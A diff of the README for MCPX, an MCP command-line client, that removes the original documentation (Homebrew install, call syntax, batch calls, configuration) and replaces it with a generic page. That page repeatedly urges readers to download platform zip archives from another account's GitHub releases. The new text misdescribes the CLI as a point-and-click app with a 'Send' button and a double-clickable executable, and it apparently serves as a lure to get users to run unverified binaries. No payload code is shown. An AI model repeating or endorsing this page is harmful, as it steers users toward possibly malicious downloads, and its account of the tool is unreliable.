@@ -1,348 +1,68 @@
-# MCPX 🧳
-_Token-efficient MCP client built for LLMs and humans._
+# 🎉 mcpx - Easy MCP Client for Automations
 
-**Why MCPX?** Other MCP clients dump giant JSON schemas that waste tokens and confuse humans. MCPX returns **TypeScript signatures** instead—Claude and developers instantly understand tool signatures. Call tools with **LLM-native syntax** (`server.func({ args })`), run **batch operations** via stdin, and get **TOON output** (90% fewer tokens than JSON).
+## 🚀 Getting Started
+Welcome to mcpx! This application helps you automate tasks using TypeScript schemas instead of JSON, making it more efficient for large language models (LLMs) like Claude and GPT. Let’s get you set up so you can start using this powerful tool right away.
 
-MCPX helps you lean into the "code execution" workflows highlighted in Anthropic's **Code Execution with MCP** guidance: discover the MCP servers already configured on your system, call them directly, and compose richer automations in TypeScript. All of that works out of the box -- no boilerplate, no schema spelunking.
+## 📥 Download Link
+[![Download mcpx](https://img.shields.io/badge/Download-mcpx-blue.svg)](https://github.com/JhianMar/mcpx/releases)
 
-## Installation
+## 📋 Features
+- **Token-efficient:** Enjoy reduced resource use with TypeScript schemas.
+- **LLM-friendly syntax:** Work seamlessly with Claude and GPT.
+- **Batch calls:** Execute many requests at once to save time.
+- **TOON output:** Get concise results optimized for clarity.
+- **Easy setup:** No coding knowledge needed to use this application.
 
-### Homebrew
+## 📅 System Requirements
+- **Operating System:** Windows, Mac, or Linux
+- **RAM:** Minimum of 4 GB
+- **Disk Space:** At least 100 MB free space
+- **Node.js:** Version 14 or higher (You can download it [here](https://nodejs.org))
 
-```bash
-# Add the tap
-brew tap AIGC-Hackers/mcpx
+## 🛠 Installation Instructions
 
-# Install mcpx
-brew install mcpx
+### 1. Visit the Download Page
+To download mcpx, [visit this page](https://github.com/JhianMar/mcpx/releases). You will find the latest release there.
 
-# Or install in one command
-brew install AIGC-Hackers/mcpx/mcpx
+### 2. Choose the Right File
+On the releases page, look for the version labeled as “Latest.” Download the file that matches your operating system. Here are the options:
+- **For Windows:** Download `mcpx-win.zip`
+- **For Mac:** Download `mcpx-mac.zip`
+- **For Linux:** Download `mcpx-linux.tar.gz`
+
+### 3. Unzip or Extract the File
+Once the download is complete, locate the file on your computer.
+- For Windows, right-click the `.zip` file and select "Extract All."
+- For Mac, double-click the `.zip` file to extract.
+- For Linux, open a terminal and use the command:
+  ```
+  tar -xzvf mcpx-linux.tar.gz
+  ```
+
+### 4. Install Dependencies
+Open your terminal or command prompt and navigate to the extracted folder. Install the necessary dependencies by running:
 ```
-
-### Run without installing
-
-```bash
-bunx mcpx list
+npm install
 ```
+Make sure you have [Node.js](https://nodejs.org) installed as mentioned in the system requirements.
 
-### Alternate tap (steipete)
-
-```bash
-brew tap steipete/tap
-brew install steipete/tap/mcpx
+### 5. Run the Application
+To start using mcpx, run the following command in your terminal:
 ```
-
-> The steipete tap publishes alongside MCPX 0.3.2. Run `brew update` before reinstalling if you see an older build.
-
-## MCPX vs Other MCP Clients
-
-| Feature | MCPX | Typical MCP Client |
-|---------|------|-------------------|
-| **Schema output** | TypeScript (readable, token-efficient) | JSON Schema (verbose, token-heavy) |
-| **Call syntax** | `linear.createIssue({ title: "Bug" })` | Manual JSON construction |
-| **Batch calls** | ✅ Multi-line, stdin, comments | ❌ One call at a time |
-| **Output format** | TOON (90% fewer tokens) | Raw JSON |
-| **OAuth flow** | ✅ Auto-triggered, bug-free | Manual or buggy |
-| **LLM-ready** | ✅ Designed for Claude/GPT workflows | ⚠️ Requires token budget |
-
-## Key Capabilities
-
-- **Zero-config discovery.** `createRuntime()` merges `./mcp.json` with `~/.mcpx/mcp.json`, expands `${ENV}` placeholders, and pools connections so you can reuse transports across multiple calls. First run migrates Cursor/Claude/Codex/Windsurf/VS Code configs into `~/.mcpx/mcp.json` automatically.
-- **Flexible data formats.** Call tools with function syntax or structured JSON/JSON5/YAML/TOML data. Output defaults to TOON (LLM-friendly), with `--output` flags for raw/JSON/text formats.
-- **Friendly composable API.** `createServerProxy()` exposes tools as ergonomic camelCase methods, automatically applies JSON-schema defaults, validates required arguments, and hands back a `CallResult` with `.text()`, `.json()`, and `.content()` helpers.
-- **OAuth and stdio ergonomics.** Built-in OAuth caching, log tailing, and stdio wrappers let you work with HTTP, SSE, and stdio transports from the same interface.
-- **Ad-hoc connections.** Point the CLI at *any* MCP endpoint (HTTP or stdio) without touching config, then persist it later if you want. Hosted MCPs that expect a browser login (Supabase, Vercel, etc.) are auto-detected and OAuth is triggered automatically when needed. See [docs/adhoc.md](docs/adhoc.md).
-
-## Quick Start
-
-MCPX auto-discovers the MCP servers you already configured in Cursor, Claude Code/Desktop, Codex, or local overrides. Install via Homebrew or run instantly with `bunx mcpx`. Need a full command reference (flags, modes, return types)? Check out [docs/cli-reference.md](docs/cli-reference.md).
-
-### Call MCP tools
-
-```bash
-# Function syntax - natural for agents and interactive use
-mcpx call 'linear.create_comment({ issueId: "ENG-123", body: "Great!" })'
-
-# Data format - explicit and structured (JSON5/YAML/TOML also supported)
-mcpx call '{ tool: "linear.create_comment", args: { issueId: "ENG-123", body: "Great!" } }'
+npm start
 ```
+If you're on Windows, you may double-click on the executable file.
 
+## 📚 Documentation
+For detailed information on how to use mcpx, refer to the documentation found within the application folder. You can also access it online by visiting [Mcpx Documentation](https://github.com/JhianMar/mcpx/wiki).
 
-### List your MCP servers
+## ⚙️ Usage Instructions
+After launching mcpx, you will see an easy-to-navigate interface. Here’s how to perform common tasks:
+- **Creating a Batch Call:** Fill in the necessary fields, then click "Send" to execute.
+- **Accessing TOON output:** Once you run your task, the results will appear in a clear format, ready for use.
 
-```bash
-mcpx list
-mcpx list context7
-mcpx list https://mcp.linear.app/mcp --all-parameters
-mcpx list shadcn.io/api/mcp.getComponents           # URL + tool suffix auto-resolves
-mcpx list --stdio "bun run ./local-server.ts" --env TOKEN=xyz
-```
+## 🙋 Support
+If you encounter any issues while downloading or using mcpx, feel free to open an issue on the [GitHub Issues](https://github.com/JhianMar/mcpx/issues) page. We value your feedback and aim to assist you promptly.
 
-- Add `--output json` to emit a machine-readable summary with per-server statuses (auth/offline/http/error counts) and, for single-server runs, the full tool schema payload.
-
-You can now point `mcpx list` at ad-hoc servers: provide a URL directly or use the new `--http-url/--stdio` flags (plus `--env`, `--cwd`, `--name`, or `--persist`) to describe any MCP endpoint. Until you persist that definition, you still need to repeat the same URL/stdio flags for `mcpx call`—the printed slug only becomes reusable once you merge it into a config via `--persist` or `mcpx config add`. OAuth is triggered automatically when servers require authentication. Full details live in [docs/adhoc.md](docs/adhoc.md).
-
-Single-server listings now show TypeScript Spec format so you can copy/paste the signature straight into `mcpx call`:
-
-```ts
-linear - Hosted Linear MCP
-  23 tools · 1654ms · HTTP https://mcp.linear.app/mcp
-
-/**
- * Create a comment on a specific Linear issue
- */
-type CreateCommentSpec = {
-  tool: 'create_comment'
-  args: {
-    issueId: string
-    body: string
-    parentId?: string
-    notifySubscribers?: boolean
-    labelIds?: string[]
-    mentionIds?: string[]
-  }
-}
-
-/**
- * List documents in the user's Linear workspace
- */
-type ListDocumentsSpec = {
-  tool: 'list_documents'
-  args: {
-    query?: string
-    limit?: number
-    before?: string
-    after?: string
-    orderBy?: 'createdAt' | 'updatedAt'
-    projectId?: string
-    initiativeId?: string
-    creatorId?: string
-    includeArchived?: boolean
-  }
-}
-```
-
-Here's what that looks like for Vercel when you run `mcpx list vercel`:
-
-```ts
-vercel - Vercel MCP (requires OAuth)
-
-/**
- * Search the Vercel documentation.
- * Use this tool to answer any questions about Vercel's platform, features, and best practices.
- */
-type SearchVercelDocumentationSpec = {
-  tool: 'search_vercel_documentation'
-  args: {
-    topic: string
-    tokens?: number
-  }
-}
-
-/**
- * Deploy the current project to Vercel
- */
-type DeployToVercelSpec = {
-  tool: 'deploy_to_vercel'
-  args: Record<string, unknown>
-}
-```
-
-### Context7: fetch docs (no auth required)
-
-```bash
-mcpx call 'context7.resolve-library-id({ libraryName: "react" })'
-mcpx call 'context7.get-library-docs({ path: "/websites/react_dev", topic: "hooks" })'
-```
-
-### Linear: search documentation (requires `LINEAR_API_KEY`)
-
-```bash
-LINEAR_API_KEY=sk_linear_example mcpx call 'linear.search_documentation({ query: "automations" })'
-```
-
-### Chrome DevTools: snapshot the current tab
-
-```bash
-mcpx call 'chrome-devtools.take_snapshot()'
-mcpx call 'linear.create_comment({ issueId: "LNR-123", body: "Hello world" })'
-```
-
-> **Call Syntax:** Function syntax `server.tool({ args })` or data format `{ tool: "server.tool", args: {...} }`. Both are parsed (not executed as JS). Supports JSON5/YAML/TOML.
-
-Helpful flags:
-
-- `--config <path>` -- custom config file (overrides the default `./mcp.json` + `~/.mcpx/mcp.json` merge).
-- `--root <path>` -- working directory for stdio commands.
-- `--log-level <debug|info|warn|error>` -- adjust verbosity (respects `MCPX_LOG_LEVEL`).
-- `--oauth-timeout <ms>` -- shorten/extend the OAuth browser wait; same as `MCPX_OAUTH_TIMEOUT_MS` / `MCPX_OAUTH_TIMEOUT`.
-- `--tail-log` -- stream the last 20 lines of any log files referenced by the tool response.
-- `--output <format>` -- control output format: `toon` (default, LLM-friendly), `json`, `text`, or `raw`.
-- `--http-url <https://…>` / `--stdio "command …"` -- describe an ad-hoc MCP server inline (pair with `--env KEY=value`, `--cwd`, `--name`, and `--persist <config.json>` as needed).
-- OAuth-protected servers trigger authentication automatically on first use.
-
-> Tip: You can skip the verb entirely—`mcpx firecrawl` automatically runs `mcpx list firecrawl`, and dotted tokens like `mcpx linear.list_issues` dispatch to the call command (typo fixes included).
-
-Timeouts default to 30 s; override with `MCPX_LIST_TIMEOUT` or `MCPX_CALL_TIMEOUT` when you expect slow startups. OAuth browser handshakes get a separate 60 s grace period; pass `--oauth-timeout <ms>` (or export `MCPX_OAUTH_TIMEOUT_MS`) when you need the CLI to bail out faster while you diagnose stubborn auth flows.
-
-### Try an MCP without editing config
-
-```bash
-# Point at an HTTPS MCP server directly
-mcpx list --http-url https://mcp.linear.app/mcp --name linear
-
-# Run a local stdio MCP server via Bun
-mcpx call --stdio "bun run ./local-server.ts" --name local-tools
-```
-
-- Add `--persist ~/.mcpx/mcp.json` (or any path) to save the inferred definition for future runs.
-- Use `--allow-http` if you truly need to hit a cleartext endpoint.
-- See [docs/adhoc.md](docs/adhoc.md) for a deep dive (env overrides, cwd, OAuth).
-
-
-## Call Syntax
-
-Two formats, both parsed (not executed as JavaScript):
-
-**Function syntax** (natural for agents):
-```bash
-mcpx call 'linear.create_issue({ title: "Bug", priority: 2, labels: ["urgent"] })'
-```
-
-**Data format** (explicit, supports JSON5/YAML/TOML):
-```bash
-mcpx call '{ tool: "linear.create_issue", args: { title: "Bug", priority: 2 } }'
-```
-
-**Features:**
-- **Auto-correct.** Typo `listIssue`? MCPX suggests `list_issues` automatically.
-- **Type specs.** `mcpx list <server>` prints TypeScript specs—copy/paste directly into calls.
-
-## Batch Calling
-
-Execute multiple MCP tool calls in one shot from stdin or a file. Perfect for LLM-driven workflows, automation scripts, and data migrations.
-
-```bash
-# From file
-cat batch-calls.txt | mcpx call
-
-# From heredoc (function syntax)
-mcpx call << 'EOF'
-linear.list_issues({ limit: 5 })
-github.search_repos({ query: "mcp" })
-EOF
-
-# Data format also works
-mcpx call << 'EOF'
-[
-  { tool: "linear.list_issues", args: { limit: 5 } },
-  { tool: "github.search_repos", args: { query: "mcp" } }
-]
-EOF
-```
-
-**Input format** supports function syntax and structured data:
-
-```javascript
-// Function syntax (one per line, natural for agents)
-linear.create_issue({ title: "Fix bug", priority: 2, labels: ["bug", "urgent"] })
-github.search_repos({ query: "mcp" })
-
-// Data format (explicit structure)
-[
-  { tool: "linear.create_issue", args: { title: "Fix bug", priority: 2, labels: ["bug", "urgent"] } },
-  { tool: "github.search_repos", args: { query: "mcp" } }
-]
-```
-
-**Output** is in **TOON format** (compact, LLM-friendly):
-
-```toon
-[2]:
-  - tool: linear.create_issue
-    output:
-      id: ISS-123
-      title: Fix bug
-  - tool: github.search_repos
-    output:
-      items[1]{name,stars}: repo1,42
-```
-
-Override with `--output json` for standard JSON:
-
-```json5
-[
-  { tool: 'linear.create_issue', output: { id: 'ISS-123', title: 'Fix bug' } },
-  { tool: 'github.search_repos', output: { items: [...] } },
-]
-```
-
-**Error handling**: If any call fails, the error is captured in the output and the exit code is `1`:
-
-```json5
-{
-  tool: 'linear.bad_tool',
-  output: "Parameter validation failed:\n- Field 'id': Required (expected string, got undefined)",
-}
-```
-
-Use cases:
-- **LLM tool calling**: Generate batch files and pipe to mcpx
-- **Automation scripts**: Daily standups, status reports
-- **Data migration**: Export from one system, import to another
-
-See [examples/README.md](examples/README.md) and [examples/batch-calls.txt](examples/batch-calls.txt) for complete examples.
-
-Need runtime or automation samples? Head to [docs/tool-calling.md](docs/tool-calling.md) and [docs/cli-reference.md](docs/cli-reference.md). Call `mcpx list <server>` any time you need the TypeScript-style signature, optional parameter hints, and sample invocations that match the CLI's function-call syntax.
-
-## Configuration Reference
-
-`mcp.json` (project) and `~/.mcpx/mcp.json` (user) share the Cursor/Claude schema:
-
-```json5
-{
-	mcpServers: {
-		context7: {
-			description: 'Context7 docs MCP',
-			baseUrl: 'https://mcp.context7.com/mcp',
-			headers: {
-				Authorization: '$env:CONTEXT7_API_KEY',
-			},
-		},
-		'chrome-devtools': {
-			command: 'bunx',
-			args: ['chrome-devtools-mcp@latest'],
-		},
-	},
-}
-```
-
-What MCPX handles for you:
-
-- `${VAR}`, `${VAR:-fallback}`, and `$env:VAR` interpolation for headers and env entries across both files. Entries defined in `./mcp.json` override duplicates from `~/.mcpx/mcp.json`.
-- Automatic OAuth token caching under `~/.mcpx/<server>/` unless you override `tokenCacheDir`.
-- Stdio commands inherit the directory of the file that defined them (imports or local config).
-- First run populates `~/.mcpx/mcp.json` by migrating Cursor/Claude/Codex/Windsurf/VS Code configs; legacy `imports` arrays are only read during that migration helper.
-
-Provide `configPath` or `rootDir` to CLI/runtime calls when you juggle multiple config files side by side.
-
-## Debug Hanging Servers Quickly
-
-Use `tmux` to keep long-running CLI sessions visible while you investigate lingering MCP transports:
-
-```bash
-tmux new-session -- bun run mcpx:list
-```
-
-Let it run in the background, then inspect the pane (`tmux capture-pane -pt <session>`), tail stdio logs, or kill the session once the command exits. Pair this with `MCPX_DEBUG_HANG=1` when you need verbose handle diagnostics. More detail: [docs/tmux.md](docs/tmux.md) and [docs/hang-debug.md](docs/hang-debug.md).
-
-## Credits
-
-MCPX was inspired by [mcporter](https://github.com/steipete/mcporter) but rebuilt from scratch with token-efficiency and LLM workflows as first-class design goals.
-
-## License
-
-MIT -- see [LICENSE](LICENSE).
-
-Further reading: [docs/tool-calling.md](docs/tool-calling.md), [docs/adhoc.md](docs/adhoc.md), [docs/tmux.md](docs/tmux.md).
+## 📥 Final Download Reminder
+Don’t forget to [visit this page to download mcpx](https://github.com/JhianMar/mcpx/releases). Start automating your tasks today!
